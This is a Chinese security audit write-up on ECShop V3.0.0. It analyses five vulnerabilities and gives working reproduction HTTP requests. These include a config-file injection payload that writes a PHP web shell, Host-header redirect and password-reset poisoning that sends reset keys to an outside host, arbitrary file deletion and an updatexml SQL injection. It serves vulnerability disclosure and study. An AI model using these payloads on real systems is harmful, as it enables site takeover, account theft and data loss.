**0x00 背景**

不久前对ECShop-V3.0.0进行了一次粗浅的审计，还是发现了一些问题。本篇分析的漏洞利用条件是比较苛刻的，但是重要的是能够在审计的过程中学习到新的思路和知识，期待和师傅们的交流讨论。

  

 **0x01 漏洞分析**

 **配置文件写入导致代码执行**

 **0x00 相关环境**

源码信息：ECShop-V3.0.0-UTF8-release0530

问题文件： \ECShop30\install\index.php

漏洞类型：配置文件写入导致代码执行

站点地址：<http://yunqi.shopex.cn/>

 **0x01 漏洞分析**

在\ECShop30\install\index.php文件的第207-227行中，使用POST请求接收配置信息的值，并且直接传入到create_config_file方法。

![方法.png](https://image.3001.net/images/20180515/15263701421313.png!small)

跟入create_config_file方法，在\ECShop30\install\includes\lib_installer.php的第312-355行中发现该该方法，其中关键代码在第341-350行，将传入的配置信息，直接写在配置文件中，整个过程未对POST传入的数据进行安全处理，因此存在配置文件写入导致代码执行的问题。

![问题.png](https://image.3001.net/images/20180515/152637017073.png!small)  

 **0x02 漏洞复现**

在进行安装操作的时候可以在如下请求包中的db_host,db_port,db_user,db_pass,db_name,db_prefix,timezone位置上写入PHP代码。如下以db_name和timezone为例。

进行如下请求，会在配置文件中写入PHP代码。

POST /install/index.php?step=create_config_file HTTP/1.1

Host: 127.0.0.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101
Firefox/56.0

Accept: */*

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Referer:
[http://127.0.0.1/install/index.php?lang=zh_cn&step=setting_ui&ui=](http://127.0.0.1/install/index.php?lang=zh_cn&step=setting_ui&ui=)

Content-Length: 324

Cookie: ECS[visit_times]=3; ECS[history]=72;
PHPSESSID=uao2tc7rcn7c7lni4afpdmo2e5

Connection: close

db_host=localhost&db_port=3306&db_user=root&db_pass=root&db_name=ecshop30%22.die(fwrite(fopen(%22evil.php%22%2C%20%22w%22)%2C%20%22%3C%3Fphp%20phpinfo()%3B%3F%3E%22)).%22&db_prefix=ecs_&timezone=PRC".die(fwrite(fopen(%22evil.php%22%2C%20%22w%22)%2C%20%22%3C%3Fphp%20phpinfo()%3B%3F%3E%22)).%22⟨=zh_cn&IS_AJAX_REQUEST=yes

请求成功后查看配置文件。

![配置.png](https://image.3001.net/images/20180515/15263702157518.png!small)

发现配置文件中的db_name和timezone位置写入了PHP代码。

![php.png](https://image.3001.net/images/20180515/15263702543272.png!small)

访问<http://127.0.0.1/data/config.php>配置文件所在的位置，便会生成evil.php的恶意文件。

![eyi.png](https://image.3001.net/images/20180515/15263702855374.png!small)

访问<http://127.0.0.1/data/evil.php>可以执行相应的PHP代码导致GetShell。

![she ll.png](https://image.3001.net/images/20180515/15263703253326.png!small)

 **HTTP Host头部攻击导致任意页面跳转**

 **0x00 相关环境**

源码信息：ECShop-V3.0.0-UTF8-release0530

问题文件： \ECShop30\install\index.php

漏洞类型：HTTP Host头部攻击导致任意页面跳转

站点地址：<http://yunqi.shopex.cn/>

 **0x01 漏洞分析**

在\ECShop30\install\index.php文件的第419行中将拼接后的url传入到header函数中然后进行跳转。

![tiaozhuan.png](https://image.3001.net/images/20180515/15263704604975.png!small)

跟入url方法，在\ECShop30\install\includes\lib_installer.php文件中的第844-851行中发现该方法，在第847行中使用$_SERVER['HTTP_HOST']方式获取主机名然后进行拼接后返回到方法被调用的位置，因此存在http
host 部攻击导致任意跳转的问题。

![wenti.png](https://image.3001.net/images/20180515/15263704996941.png!small)

  

 **0x02 漏洞复现**

进行如下请求，返回302跳转到[www.evil.com](http://www.evil.com)站点。

GET /install/index.php?lang=zh_cn&step=done&type=yunqi HTTP/1.1

Host: [www.evil.com](http://www.evil.com)

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101
Firefox/56.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Referer:
[http://127.0.0.1/install/index.php?lang=zh_cn&step=setting_ui&ui=](http://127.0.0.1/install/index.php?lang=zh_cn&step=setting_ui&ui=)

Connection: close

Upgrade-Insecure-Requests: 1

![1.png](https://image.3001.net/images/20180515/15263705526592.png!small)

 **  
**

 **HTTP Host头部攻击导致前台任意密码重置**

 **0x00 相关环境**

源码信息：ECShop-V3.0.0-UTF8-release0530

问题文件： \ECShop30\user.php

漏洞类型：HTTP Host头部攻击导致前台任意密码重置

站点地址：<http://yunqi.shopex.cn/>

 **0x01 漏洞分析**

在\ECShop30\user.php文件的第719行中，当使用邮箱进行密码重置的时候，会调用send_pwd_email的方法。

![email.png](https://image.3001.net/images/20180515/15263707041628.png!small)

跟入send_pwd_email方法，在\ECShop30\includes\lib_passport.php文件的第279行中使用了url方法，然后将邮件中的正文内容进行拼接，拼接后的结果为$content，再将$content传入send_mail方法。

![send.png](https://image.3001.net/images/20180515/15263707945498.png!small)

跟入url方法，在\ECShop30\includes\cls_ecshop.php文件的第128-142行中发现该方法，该方法return的时候调用了get_domain方法。

![domain.png](https://image.3001.net/images/20180515/15263708503381.png!small)

跟入get_domain方法，在\ECShop30\includes\cls_ecshop.php文件的第77-119行中发现该方法，在改文件的第83-90行中，使用了$_SERVER['HTTP_X_FORWARDED_HOST']和$_SERVER['HTTP_HOST']来获取主机域名和IP地址，属于用户可以控制的输入点。因此整个发送邮件过程中，正文部分可以通过修改HTTP
请求的host进行伪造。

![weizao.png](https://image.3001.net/images/20180515/15263710105643.png!small)  

 **0x02 漏洞复现**

在得知用户名和注册邮箱的情况下，可以使用如下的请求发送密码重置链接。

POST /user.php HTTP/1.1

Host: [www.balabala.com:@host.2tzion.ceye.io](http://host.2tzion.ceye.io)

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101
Firefox/56.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 98

Referer: <http://127.0.0.1/user.php?act=get_password>

Cookie: ECS[visit_times]=2; ECS_ID=500ac5868ca2faceb1b34797cd8f7bebf6ed1009

client-ip: 127.0.0.2

X-Forwarded-For: 127.0.0.3

Connection: close

Upgrade-Insecure-Requests: 1

user_name=Thinking&email=thinking_balabala%40163.com&act=send_pwd_email&submit=%E6%8F%90+%E4%BA%A4

受害者就会收到一封如下信息的邮件，点击邮件中的重置密码链接就会将重置密码的key发送到攻击者的服务器上。

![fuwuqi.png](https://image.3001.net/images/20180515/15263710531000.png!small)

攻击者收到重置密码的code，便可以进行密码重置。

![chongzhi
1.png](https://image.3001.net/images/20180515/15263716317350.png!small)

![chongzhi
2.png](https://image.3001.net/images/20180515/15263716785973.png!small)

  

 **后台任意文件删除**

 **0x00 相关环境**

源码信息：ECShop-V3.0.0-UTF8-release0530

问题文件： \ECShop30\admin\article.php

漏洞类型：后台任意文件删除

站点地址：<http://yunqi.shopex.cn/>

 **0x01 漏洞分析**

在\ECShop30\admin\article.php文件的第117-192是问题的代码块，其中第150行使用POST接收file_url参数的值，然后将内容插入到数据库中的article表。

![表.png](https://image.3001.net/images/20180515/15263721662547.png!small)

然后在该文件的第379-383行中，从数据库的article表将file_url，取出来进行然后使用unlink进行删除操作，整个过程未对文件名称进行安全处理，导致存在任意文件删除漏洞。

![删除.png](https://image.3001.net/images/20180515/15263722047374.png!small)

 **0x02 漏洞复现**

先将要删除的文件路径添加到file_url参数的位置，然后进行如下请求，往数据库的article表中插入一条带有要删除的目标文件路径的数据。

POST /admin/article.php HTTP/1.1

Host: 127.0.0.1

Content-Length: 1873

Cache-Control: max-age=0

Origin: <http://127.0.0.1>

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/55.0.2883.87 Safari/537.36

Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryab9PkzCWZGRw6awU

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Referer: <http://127.0.0.1/admin/article.php?act=add>

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.8

Cookie: loginNum=3;
ECS_LastCheckOrder=Tue%2C%2023%20Jan%202018%2002%3A55%3A15%20GMT;
Toggle_State_1={},Wed, 24 Jan 2018 06:42:48 GMT;
ECSCP[lastfilterfile]=23A0E66;
ECSCP[lastfilter]=a%253A9%253A%257Bs%253A7%253A%2522keyword%2522%253Bs%253A0%253A%2522%2522%253Bs%253A6%253A%2522cat_id%2522%253Bi%253A0%253Bs%253A7%253A%2522sort_by%2522%253Bs%253A12%253A%2522a.article_id%2522%253Bs%253A10%253A%2522sort_order%2522%253Bs%253A4%253A%2522DESC%2522%253Bs%253A12%253A%2522record_count%2522%253Bs%253A2%253A%252235%2522%253Bs%253A9%253A%2522page_size%2522%253Bi%253A15%253Bs%253A4%253A%2522page%2522%253Bi%253A1%253Bs%253A10%253A%2522page_count%2522%253Bd%253A3%253Bs%253A5%253A%2522start%2522%253Bi%253A0%253B%257D;
ECSCP[lastfiltersql]=U0VMRUNUIGEuKiAsIGFjLmNhdF9uYW1lIEZST00gYGVjc2hvcDMwYC5gZWNzX2FydGljbGVgIEFTIGEgTEVGVCBKT0lOIGBlY3Nob3AzMGAuYGVjc19hcnRpY2xlX2NhdGAgQVMgYWMgT04gYWMuY2F0X2lkID0gYS5jYXRfaWQgV0hFUkUgMSAgT1JERVIgYnkgYS5hcnRpY2xlX2lkIERFU0M%3D;
security_level=1; __guid=96992031.2794073907059157500.1501489482338.276;
sYQDUGqqzHsearch_history=a%7C1; a9617_times=1; bdshare_firstime=1510970163771;
ECS_ID=54f1ee86ca058e2980cef4a2a937ba2697eb82ea; ECS[visit_times]=1;
ECSCP_ID=0c82abaa20ce2ecacb164e5218eaccbc3e3ce52f; monitor_count=9

Connection: close

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="title"

balabala1

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="article_cat"

2

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="article_type"

0

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="is_open"

1

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="author"

thinking

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="author_email"

thinking@qq.com

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="keywords"

1

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="description"

1

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="link_url"

<http://host.2tzion.ceye.io>

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="file"; filename=""

Content-Type: image/png

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="file_url"

data/install.lock

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="FCKeditor1"

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="cat_id"

0

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="brand_id"

0

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="keyword"

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="act"

insert

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="old_title"

\------WebKitFormBoundaryab9PkzCWZGRw6awU

Content-Disposition: form-data; name="id"

\------WebKitFormBoundaryab9PkzCWZGRw6awU--
然后进行如下请求，删除对应的id号的内容，删除的同时就会将上一步请求的文件进行unlink操作。

GET
/admin/article.php?is_ajax=1&act=remove&id=39&keyword=&cat_id=0&sort_by=a.article_id&sort_order=DESC&record_count=36&page_size=15&page=1&page_count=3&start=0&1516676396253253
HTTP/1.1

Host: 127.0.0.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/55.0.2883.87 Safari/537.36

Accept: */*

Referer: <http://127.0.0.1/admin/article.php?act=list>

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.8

Cookie: loginNum=3; Toggle_State_1={},Wed, 24 Jan 2018 06:42:48 GMT;
ECS_LastCheckOrder=Tue%2C%2023%20Jan%202018%2002%3A58%3A47%20GMT;
ECSCP[lastfilterfile]=23A0E66;
ECSCP[lastfilter]=a%253A9%253A%257Bs%253A7%253A%2522keyword%2522%253Bs%253A0%253A%2522%2522%253Bs%253A6%253A%2522cat_id%2522%253Bi%253A0%253Bs%253A7%253A%2522sort_by%2522%253Bs%253A12%253A%2522a.article_id%2522%253Bs%253A10%253A%2522sort_order%2522%253Bs%253A4%253A%2522DESC%2522%253Bs%253A12%253A%2522record_count%2522%253Bs%253A2%253A%252236%2522%253Bs%253A9%253A%2522page_size%2522%253Bi%253A15%253Bs%253A4%253A%2522page%2522%253Bi%253A1%253Bs%253A10%253A%2522page_count%2522%253Bd%253A3%253Bs%253A5%253A%2522start%2522%253Bi%253A0%253B%257D;
ECSCP[lastfiltersql]=U0VMRUNUIGEuKiAsIGFjLmNhdF9uYW1lIEZST00gYGVjc2hvcDMwYC5gZWNzX2FydGljbGVgIEFTIGEgTEVGVCBKT0lOIGBlY3Nob3AzMGAuYGVjc19hcnRpY2xlX2NhdGAgQVMgYWMgT04gYWMuY2F0X2lkID0gYS5jYXRfaWQgV0hFUkUgMSAgT1JERVIgYnkgYS5hcnRpY2xlX2lkIERFU0M%3D;
security_level=1; __guid=96992031.2794073907059157500.1501489482338.276;
sYQDUGqqzHsearch_history=a%7C1; a9617_times=1; bdshare_firstime=1510970163771;
ECS_ID=54f1ee86ca058e2980cef4a2a937ba2697eb82ea; ECS[visit_times]=1;
ECSCP_ID=0c82abaa20ce2ecacb164e5218eaccbc3e3ce52f; monitor_count=10

Connection: close

![close.png](https://image.3001.net/images/20180515/15263722879826.png!small)  

 **后台SQL注入**

 **0x01 相关环境**

源码信息： ECShop_V3.0.0_UTF8_release0518

问题文件：/admin/shophelp.php

漏洞类型：SQL注入漏洞

 **0x02 漏洞分析**

在/admin/shophelp.php的第153-174行代码中的$_POST['id']在没有经过安全处理和过滤的情况下直接传递拼接到SQL语句中，导致SQL注入漏洞。

if ($_REQUEST['act'] == 'update')

{

/* 权限判断 */

admin_priv('shophelp_manage');

/* 检查重名 */

if ($_POST['title'] != $_POST['old_title'] )

{

$exc_article->is_only('title', $_POST['title'], $_LANG['articlename_exist'],
$_POST['id']);

}

/* 更新 */

if ($exc_article->edit("title = '$_POST[title]', cat_id = '$_POST[cat_id]',
article_type = '$_POST[article_type]', content = '$_POST[FCKeditor1]'",
$_POST['id']))

{

/* 清除缓存 */

clear_cache_files();

$link[0]['text'] = $_LANG['back_list'];

$link[0]['href'] = 'shophelp.php?act=list_article&cat_id='.$_POST['cat_id'];

sys_msg(sprintf($_LANG['articleedit_succeed'], $_POST['title']), 0, $link);

admin_log($_POST['title'], 'edit', 'shophelp');

}

}

在检测重命名的代码块里面的$_POST['id']存在数字型注入，可以利用该漏洞获取数据库中敏感信息。

$exc_article->is_only('title', $_POST['title'], $_LANG['articlename_exist'],
$_POST['id']);

  

 **0x03 漏洞复现**

可以用报错注入得到数据库数据，如使用下面的payload可以获取数据库中的信息

POST /code/ECShop30/admin/shophelp.php?act=update HTTP/1.1

Host: 127.0.0.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101
Firefox/53.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 116

Cookie: ECSCP_ID=328cb50e35929abc119899c12b9a46495ca49fcf

Connection: close

Upgrade-Insecure-Requests: 1

title=aaa&old_title=bbb&cat_id=2&article_type=1&FCKeditor1=ccc&id=updatexml(0,(concat(0x7e,(select
user()),0x7e)),0)

![0.png](https://image.3001.net/images/20180515/15263725128596.png!small)

 **0x02 小结**

本篇分析了ecshop的一些漏洞，其中HTTP
host注入导致的前台密码重置还需要结合社会工程学进行利用，利用条件确实苛刻，本来想在host中直接引入<img>标签，打开邮件就直接请求url了，利用这种方式得到重置密码的code，但是发现无法引入标签，如果师傅们有更好的思路期待能一起交流讨论，但是如果是hc请走开勿扰，交流学习可联系我thinking_balabala@163.com。

![qrcode_for_gh_223e082fe8a7_344.jpg](https://image.3001.net/images/20180515/15263726032444.jpg!small)

